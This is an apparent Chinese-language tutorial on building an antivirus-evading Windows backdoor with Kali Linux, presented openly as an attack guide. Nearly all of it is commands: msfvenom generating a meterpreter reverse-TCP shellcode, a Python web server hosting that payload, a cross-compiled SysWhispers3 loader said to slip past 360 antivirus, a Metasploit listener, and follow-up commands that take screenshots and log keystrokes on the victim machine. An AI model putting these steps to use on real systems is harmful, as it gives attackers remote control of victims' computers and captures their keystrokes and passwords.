### Kali 后门 免杀 过360
**先大体浏览一下，再跟着做**

**第一步：** 在Kali中使用`msfvenom`生成Shellcode：

```
msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=x.x.x.x lport=4444 -f raw -o beacon.bin
```

**第二步：** 使用Python 3开启Web服务

1. 新建一个文件夹作为Web服务的目录：

```
mkdir http
```

2. 将生成的 `beacon.bin` 移动到 `http` 目录：

```
mv beacon.bin ./http/
```

3. 启动Web服务：

```
sudo python3 -m http.server -d ./http/
```

**第三步：** 生成exe文件

1. 修改 `SysWhispers3WinHttp.c` 文件的第40行IP地址。
2. 使用Linux 64位GCC进行交叉编译：

```
x86_64-w64-mingw32-gcc -o SysWhispers3WinHttp.exe syscalls64.c SysWhispers3WinHttp.c -masm=intel -w -s -lwinhttp -O1
```

3. 将生成的exe文件拷贝到Windows机器中。

**第四步：** 开启msf监听

1. 进入框架：

```
msfconsole
```

2. 使用监听模块：

```
use exploit/multi/handler
```

3. 设置载荷：`set payload windows/x64/meterpreter/reverse_tcp`
4. 设置IP和端口与第一步中一致：`set LHOST x.x.x.x` 和 `set LPORT 4444`
5. 运行：`run`

**第五步：** 运行后门

**第六步：** 监听机器

1. 显示会话：`sessions -l`
2. 进入会话：`session 2`
3. 退出会话：`bg`
4. 基础信息查看
   - 查看系统信息：`sysinfo`
   - 查看用户权限：`getuid`
   - 截图：`screenshot`
   - 开启键盘记录功能：`keyscan_start`
   - 显示捕捉到的键盘记录信息：`keyscan_dump`
